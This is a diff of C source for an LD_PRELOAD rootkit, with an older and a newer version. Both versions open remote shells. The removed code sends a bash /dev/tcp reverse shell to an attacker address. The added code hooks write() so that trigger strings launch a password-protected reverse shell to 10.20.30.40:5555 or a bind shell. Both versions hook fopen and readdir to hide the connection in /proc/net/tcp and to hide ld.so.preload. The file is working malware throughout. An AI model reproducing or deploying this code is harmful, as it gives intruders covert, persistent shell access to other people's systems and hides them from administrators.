@@ -1,270 +1,285 @@
-// standard libraries
-#include <dirent.h>
-#include <dlfcn.h>
+//libraries
+#include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
+#include <dlfcn.h>
 #include <unistd.h>
-#include <stdlib.h>
-
-
-
-// network libraries
-#include <sys/types.h>
-#include <sys/socket.h>
+#include <fcntl.h>
+#include <dirent.h>
+#include <netdb.h>
 #include <arpa/inet.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/stat.h>
 
-// debug
-//#define DEBUG                           // uncomment for debug statements in /tmp/debug.txt
-#define DEBUG_FILE "/tmp/debug.txt"     // create this file yourself with 666 permissions otherwise ERRORS 
-                                        // (because function hooks on lower privilege processes won't have write access to the file)
-                                        // touch /tmp/debug.txt -> chmod 666 /tmp/debug.txt
-
-#define ATTACKER_IP "127.0.0.1"
-#define ATTACKER_IP_HEX_NBO "0100007F"   // hex network-byte-order (reversed) version of attacker IP
-#define ATTACKER_PORT 9001
-#define HIDEFILE "ld.so.preload"         // name of file you want to hide
-#define IPV4_INFO_FILE "/proc/net/tcp"
-
-// ORIGINAL FUNCTIONS
-//int (*orig_accept)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
-FILE *(*orig_fopen)(const char *pathname, const char *mode);
-FILE *(*orig_fopen64)(const char *pathname, const char *mode);
-struct dirent *(*orig_readdir)(DIR *dirp);
-struct dirent64 *(*orig_readdir64)(DIR *dirp);
+#define REVTRIGGER "plsrev" //  presence of this string will trigger the REV Shell
+#define BINDTRIGGER "plsbind" // presence of this string will trigger the BIND Shell
+#define PASS "6u9" // password for shell access
+#define PORT "5555" // port to listen on / connect to
+#define HEXPORT "15B3" // hex value reflected in netstat
+#define FILENAME "ld.so.preload"
+#define IP "10.20.30.40" // IP to connect to
 
 
-void payload() {
-    system("bash -c 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1'");
-}
+/* I KEEP FORGETING THIS :
 
-int strncmp(const char *__s1, const char *__s2, size_t __n) {    // 这里函数的定义可以根据报错信息进行确定
-    if (getenv("LD_PRELOAD") == NULL) {
+    struct addrinfo {
+    int              ai_flags;     // AI_PASSIVE, AI_CANONNAME, etc.
+    int              ai_family;    // AF_INET, AF_INET6, AF_UNSPEC
+    int              ai_socktype;  // SOCK_STREAM, SOCK_DGRAM
+    int              ai_protocol;  // use 0 for "any"
+    size_t           ai_addrlen;   // size of ai_addr in bytes
+    struct sockaddr *ai_addr;      // struct sockaddr_in or _in6
+    char            *ai_canonname; // full canonical hostname
+
+    struct addrinfo *ai_next;      // linked list, next node
+    };
+
+    int getaddrinfo(const char *node,     // e.g. "www.example.com" or IP
+            const char *service,  // e.g. "http" or port number
+            const struct addrinfo *hints,
+            struct addrinfo **res);
+*/
+ssize_t write(int fildes, const void *buf, size_t nbytes) ;
+int ip_rev(void)
+{
+    int s;
+    if((s=socket(AF_INET,SOCK_STREAM,0))==-1)
+    {
+        //perror("[-] Error Creating Socket Descriptor\n");     
+        return -1;
+    }
+
+    int optval=1;
+    if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&optval,sizeof(optval))==-1)
+    {
+        //perror("[-] Error in setsockopt()\n");
+        return -2;
+    }
+
+    struct addrinfo hints, *res;
+    memset(&hints, 0, sizeof(hints));
+
+    hints.ai_family = AF_UNSPEC;  // use IPv4 or IPv6, whichever
+    hints.ai_socktype = SOCK_STREAM;
+    getaddrinfo(IP, PORT, &hints, &res);
+
+    int flag =0;
+    while(connect(s,res->ai_addr,res->ai_addrlen) != 0)
+    {
+        sleep(1);
+        flag = flag+1;
+        if(flag > 5)
+            return -3;
+    }
+
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
+
+    char input[30];
+    read(s, input, sizeof(input)); // Read Input Stream For Password
+
+    if (strncmp(input,PASS,strlen(PASS))==0)
+    {
+        char *shell[2];
+        shell[0]="/bin/sh";
+        shell[1]=NULL;
+        execve(shell[0],shell, NULL); // Call Our Shell
+        close(s);
         return 0;
     }
-    unsetenv("LD_PRELOAD");
-    payload();
-}
-
-int ipv4_reverse()
-{
-    #ifdef DEBUG
-        FILE *debugFile = orig_fopen64(DEBUG_FILE, "a+");
-        fprintf(debugFile, "ipv4_reverse() hit. sending reverse shell... \n");
-    #endif
-
-    struct sockaddr_in remoteHost;
-    remoteHost.sin_family = AF_INET;
-    remoteHost.sin_addr.s_addr = inet_addr(ATTACKER_IP);
-    remoteHost.sin_port = htons(ATTACKER_PORT);
-
-    // create socket
-    int tcpSocket_fd = socket(AF_INET, SOCK_STREAM, 0);
-
-    // connect to remote listener
-    connect(tcpSocket_fd, (struct sockaddr *)&remoteHost, sizeof(remoteHost));
-
-    // inform remote host
-    char message[] = "[+] spawning shell... \n";
-    send(tcpSocket_fd, message, sizeof(message), 0);
-
-    // fork and spawn /bin/sh
-    // if no fork, reverse shell work once and then pause the ssh service (because spawning a shell)
-    if (fork() == 0)
-    {
-        // create copy of socket file descriptor on stdin 0, stdout 1, and stderr 2 with dup2
-        for (int i = 0; i < 2; i++)
-        {
-            dup2(tcpSocket_fd, i);
-        }
-
-        // spawn shell
-        execve("/bin/sh", NULL, NULL);
-
-        close(tcpSocket_fd);
-    }
-
-    #ifdef DEBUG
-        fclose(debugFile);
-    #endif
-
-    close(tcpSocket_fd);
-    return 0;
-}
-
-
-
-// fopen() HOOKED FUNCTION
-FILE *fopen(const char *pathname, const char *mode) 
-{   
-    FILE *filePointer;      // fopen() return value
-    orig_fopen = dlsym(RTLD_NEXT, "fopen");    // point to next runtime instance of fopen()
-
-    #ifdef DEBUG
-        FILE *debugFile = orig_fopen(DEBUG_FILE, "a+");
-        fprintf(debugFile, "fopen() intercepted. \n");
-    #endif
-
-    // if fopen() is reading "/proc/net/tcp"
-    if (strcmp(pathname, IPV4_INFO_FILE) == 0) 
-    {
-        #ifdef DEBUG
-            fprintf(debugFile, "fopen(\"/proc/net/tcp\") intercepted. \n");
-        #endif
-        
-        FILE *tmp = tmpfile();                           // open tmp file 
-        FILE *targetFile = orig_fopen(pathname, mode);   // open "/proc/net/tcp"
-        char line[256];                                  // var to store read lines
-        // read target file line by line until empty
-        while (fgets(line, sizeof(line), targetFile) != NULL)
-        {
-            // if line DOES NOT contain ATTACKER_IP
-            if (strstr(line, ATTACKER_IP_HEX_NBO) == NULL)
-            {
-                #ifdef DEBUG
-                    fprintf(debugFile, "writing line to tmpfile() \n");
-                #endif  
-                
-                // write line to tmpfile
-                fputs(line, tmp);
-            }
-            // if line DOES contin ATTACKER_IP
-            else
-            {
-                #ifdef DEBUG
-                    fprintf(debugFile, "ATTACKER_IP found! not writing line to tmpfile() \n");
-                #endif  
-                
-                // do nothing (i.e. don't write line)
-            }
-        }
-
-        rewind(tmp);        // rewind() file pointer to beginning of stream
-        filePointer = tmp;  // set filePointer so that tmpfile() containing tampered /proc/net/tcp will be returned
-        
-    }
-    // if fopen() isn't reading "/proc/net/tcp"
     else
     {
-        // open the file
-        filePointer = orig_fopen(pathname, mode);
+        shutdown(s,SHUT_RDWR); // Shutdown Further R/W Operation From Client
+        close(s);
+        return -4;
+    }
+}
+
+int ip_bind(void)
+{   
+    int s;
+    if ((s=socket(AF_INET,SOCK_STREAM,0))==-1) // Create Socket FD
+    {
+        //perror("[-] Error Creating Socket Descriptor\n");     
+        return -1;
     }
 
-    #ifdef DEBUG
-        fclose(debugFile);
-    #endif
+    int optval=1;
+    if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&optval,sizeof(optval))==-1) // Allow reusability of the socket
+    {
+        //perror("[-] Error in setsockopt()\n");
+        return -2;
+    }
+
+    struct addrinfo hints, *res;
+    memset(&hints, 0, sizeof(hints)); // Zero out the garbage values in memory
+    hints.ai_family = AF_UNSPEC;  // Use IPv4 or IPv6, whichever
+    hints.ai_socktype = SOCK_STREAM; // TCP
+    hints.ai_flags = AI_PASSIVE;     // Fill in my IP for me
     
-    return filePointer;
-}
+    getaddrinfo(NULL, PORT, &hints, &res); // Fill the structure    
 
-// fopen64() HOOKED FUNCTION - reads "/proc/net/tcp"
-FILE *fopen64(const char *pathname, const char *mode) 
-{   
-    FILE *filePointer;      // fopen64() return value
-    orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");    // point to next runtime instance of fopen64()
-
-    #ifdef DEBUG
-        FILE *debugFile = orig_fopen64(DEBUG_FILE, "a+");
-        fprintf(debugFile, "fopen64() intercepted. \n");
-    #endif
-
-    // if fopen64() is reading "/proc/net/tcp"
-    if (strcmp(pathname, IPV4_INFO_FILE) == 0) 
+    if((bind(s,res->ai_addr,res->ai_addrlen))==-1)
     {
-        #ifdef DEBUG
-            fprintf(debugFile, "fopen64(\"/proc/net/tcp\") intercepted. \n");
-        #endif
-        
-        FILE *tmp = tmpfile();                           // open tmp file 
-        FILE *targetFile = orig_fopen64(pathname, mode); // open "/proc/net/tcp"
-        char line[256];                                  // var to store read lines
-        // read target file line by line until empty
-        while (fgets(line, sizeof(line), targetFile) != NULL)
-        {
-            // if line DOES NOT contain OUTBOUND_PORT
-            if (strstr(line, ATTACKER_IP_HEX_NBO) == NULL)
-            {
-                #ifdef DEBUG
-                    fprintf(debugFile, "writing line to tmpfile() \n");
-                #endif  
-                
-                // write line to tmpfile
-                fputs(line, tmp);
-            }
-            // if line DOES contin OUTBOUND_PORT
-            else
-            {
-                #ifdef DEBUG
-                    fprintf(debugFile, "OUTBOUND_PORT found! not writing line to tmpfile() \n");
-                #endif  
-                
-                // do nothing (i.e. don't write line)
-            }
-        }
-
-        rewind(tmp);        // rewind() file pointer to beginning of stream
-        filePointer = tmp;  // set filePointer so that tmpfile() containing tampered /proc/net/tcp will be returned
-        
+        //perror("[+] Failed To Bind Port \n");
+        return -3;  
     }
-    // if fopen64() isn't reading "/proc/net/tcp"
+
+    if(listen(s,5) == -1) // Listen On The Specified Port With a backlog of 5
+    {
+        //perror("[-] Could Not Listen\n");
+        return -4;
+    }
+
+    int conn_fd; // FD for client connections
+    
+    // accept(sock, (struct sockaddr *) &client_address, &client_length); can also be done but I dont want my IP to be known to the server  
+    conn_fd = accept(s, NULL, NULL);
+    if(conn_fd == -1)
+    {
+        //perror("[-] Could Not Accept Connection\n");
+        exit(-5);
+    }   
+
+    dup2(conn_fd, 0);
+    dup2(conn_fd, 1);
+    dup2(conn_fd, 2);
+
+    char input[30];
+    read(conn_fd, input, sizeof(input)); // Read Input Stream For Password
+    if (strncmp(input,PASS,strlen(PASS))==0)
+    {
+        char *shell[2];
+        shell[0]="/bin/sh";
+        shell[1]=NULL;
+        execve(shell[0],shell, NULL); // Call Our Shell
+        close(s);
+        return 0;
+    }
+    
     else
     {
-        // open the file
-        filePointer = orig_fopen64(pathname, mode);
+        shutdown(conn_fd,SHUT_RDWR); // Shutdown Further R/W Operation From Client
+        close(s);
+        return -5;
     }
+}
+ssize_t write(int fildes, const void *buf, size_t nbytes) // From Manual
+{
+    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes); // Create A New Function Pointer
+    ssize_t result;
 
-    #ifdef DEBUG
-        fclose(debugFile);
-    #endif
-
-    return filePointer;
+    new_write = dlsym(RTLD_NEXT, "write"); // Find the next occurrence of the desired symbol in the search order after the current object
+    
+    if (strstr(buf,BINDTRIGGER) != NULL) // Check If A Particular String Is Present In The ind Shell And Trigger Accordingly
+    {
+        fildes = open("/dev/null", O_WRONLY | O_APPEND);
+        result = new_write(fildes,buf,nbytes);
+        ip_bind();
+    }
+    else if(strstr(buf,REVTRIGGER) != NULL)
+    {
+        fildes = open("/dev/null", O_WRONLY | O_APPEND);
+        result = new_write(fildes,buf,nbytes);
+        ip_rev();   
+    }
+    else
+    {
+        result = new_write(fildes, buf, nbytes);
+    }
+    return result;
 }
 
-// readdir() HOOKED FUNCTION
-struct dirent *readdir(DIR *dirp) 
+FILE *fopen(const char *pathname, const char *mode)
 {
-    struct dirent *dirPointer;  // return value of readdir() (a pointer to a dirent structre)
-    orig_readdir = dlsym(RTLD_NEXT, "readdir");
+    FILE *(*orig_fopen)(const char *pathname, const char *mode);
+    orig_fopen=dlsym(RTLD_NEXT,"fopen");
+    char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
+    FILE *fp;
 
-    #ifdef DEBUG
-        FILE *debugFile = orig_fopen(DEBUG_FILE, "a+");
-        fprintf(debugFile, "readdir() intercepted. \n");
-    #endif
-
-    // while directories are being read (while dirPointer contains a value)
-    while (dirPointer = orig_readdir(dirp))
+    if (ptr_tcp != NULL)
     {
-        // if readdir() struct's d_name member DOES CONTAIN "ld.so.preload"
-        if (strstr(dirPointer->d_name, HIDEFILE) == 0)
+        char line[256];
+        FILE *temp = tmpfile();
+        fp = orig_fopen(pathname, mode);
+        while (fgets(line, sizeof(line), fp))
         {
-            // stop reading readdir() struct
-            break;
+            char *listener = strstr(line, HEXPORT);
+            if (listener != NULL)
+            {
+                continue;
+            }
+            else
+            {
+                fputs(line, temp);
+            }
         }
+        return temp;
     }
-
-    return dirPointer;
+    
+    fp = orig_fopen(pathname, mode);
+    return fp;
 }
 
-// readdir() HOOKED FUNCTION
-struct dirent64 *readdir64(DIR *dirp) 
+
+FILE *fopen64(const char *pathname, const char *mode)
 {
-    struct dirent64 *dirPointer64;  // return value of readdir64() (a pointer to a dirent structre)
-    orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
+    FILE *(*orig_fopen64)(const char *pathname, const char *mode);
+    orig_fopen64=dlsym(RTLD_NEXT,"fopen64");
+    char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
+    FILE *fp;
 
-    #ifdef DEBUG
-        FILE *debugFile = orig_fopen(DEBUG_FILE, "a+");
-        fprintf(debugFile, "readdir64() intercepted. \n");
-    #endif
-
-    // while directories are being read (while dirPointer contains a value)
-    while (dirPointer64 = orig_readdir64(dirp))
+    if (ptr_tcp != NULL)
     {
-        // if readdir() struct's d_name member DOES CONTAIN "ld.so.preload"
-        if (strstr(dirPointer64->d_name, HIDEFILE) == 0)
+        char line[256];
+        FILE *temp64 = tmpfile64();
+        fp = orig_fopen64(pathname, mode);
+        while (fgets(line, sizeof(line), fp))
         {
-            // stop reading readdir() struct
-            break;
-        }
+            char *listener = strstr(line, HEXPORT);
+            if (listener != NULL)
+            {
+                continue;
+            }
+            else
+            {
+                fputs(line, temp64);
+            }
+        }           
+        return temp64;
     }
+    
+    fp = orig_fopen64(pathname, mode);
+    return fp;
+}
 
-    return dirPointer64;
+struct dirent *readdir(DIR *dirp)
+{
+    struct dirent *(*new_readdir)(DIR *dir);
+    new_readdir=dlsym(RTLD_NEXT,"readdir");
+    struct dirent *olddir;
+
+    while(olddir = new_readdir(dirp))
+    {
+        if(strstr(olddir->d_name,FILENAME) == 0)
+            break;
+    }
+    return olddir;
+}
+
+struct dirent64 *readdir64(DIR *dirp)
+{
+    struct dirent64 *(*new_readdir64)(DIR *dir);
+    new_readdir64=dlsym(RTLD_NEXT,"readdir64");
+    struct dirent64 *olddir;
+
+    while(olddir = new_readdir64(dirp))
+    {
+        if(strstr(olddir->d_name,FILENAME) == 0)
+            break;
+    }
+    return olddir;
 }
